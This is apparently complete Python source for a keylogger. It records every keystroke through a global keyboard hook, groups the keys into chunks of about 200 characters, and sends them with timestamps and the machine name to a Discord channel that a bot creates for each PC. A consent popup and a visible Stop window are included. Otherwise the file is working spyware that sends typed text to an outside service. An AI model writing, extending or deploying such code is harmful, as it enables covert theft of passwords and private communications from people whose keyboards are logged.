import discord
import asyncio
import os
import tkinter as tk
from tkinter import messagebox
import threading
import keyboard
from datetime import datetime

# Discord bot token
BOT_TOKEN  = 'YOUR_DISCORD_BOT_TOKEN'  # Replace with your bot token

# Function to check if a channel exists and create a new channel if it doesn't
async def create_channel_if_not_exists(client, channel_name):
    for guild in client.guilds:
        existing_channel = discord.utils.get(guild.channels, name=channel_name.lower())
        if existing_channel:
            print(f"Channel '{channel_name}' already exists.")
            return existing_channel
        else:
            new_channel = await guild.create_text_channel(channel_name.lower())
            print(f"Channel '{channel_name}' created.")
            return new_channel
    return None

# Discord client setup
intents = discord.Intents.default()
client = discord.Client(intents=intents)

# Global variable for the PC name
pc_name = ""

# Function to start the key logger
full_sentence = ""
def start_key_logger(channel):
    def key_press(event):
        global full_sentence
        key_name = event.name.replace(" ", "_").capitalize()
        if event.event_type == keyboard.KEY_DOWN:
            if len(event.name) > 1:
                full_sentence += f" [{key_name}] "
            else:
                full_sentence += event.name
        
        if len(full_sentence) > 200:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            message = f"{timestamp} [{pc_name}]: {full_sentence}"
            asyncio.run_coroutine_threadsafe(channel.send(message), client.loop)
            full_sentence = ""

    keyboard.on_press(key_press)

# Event handler for when the bot is ready
@client.event
async def on_ready():
    global pc_name
    pc_name = os.getenv('COMPUTERNAME', 'Unknown-PC')  # Get the PC name (Windows)
    if pc_name == 'Unknown-PC':
        pc_name = os.uname().nodename  # Get the PC name (Unix-based systems)
    channel = await create_channel_if_not_exists(client, pc_name)
    start_key_logger(channel)

# Function to start the Discord bot
def start_discord_bot():
    asyncio.run(client.start(BOT_TOKEN))

# Setup the GUI
def show_message():
    root = tk.Tk()
    root.title("Keylogger")
    label = tk.Label(root, text="Keylogger is running...", fg="green")
    label.pack()
    stop_button = tk.Button(root, text="Stop", command=stop_key_logger, fg="red")
    stop_button.pack()
    root.mainloop()

# Function to stop the key logger
def stop_key_logger():
    os._exit(0)

# Function to display the initial popup message
def show_initial_message():
    response = messagebox.askyesno("Warning", "This is a keylogger. Do you wish to continue?")
    if response:
        # Start the Discord bot in a separate thread
        bot_thread = threading.Thread(target=start_discord_bot)
        bot_thread.start()
        # Show the message to the user
        show_message()
    else:
        os._exit(0)

# Initialize the GUI for the popup message
root = tk.Tk()
root.withdraw()  # Hide the root window
show_initial_message()
root.mainloop()
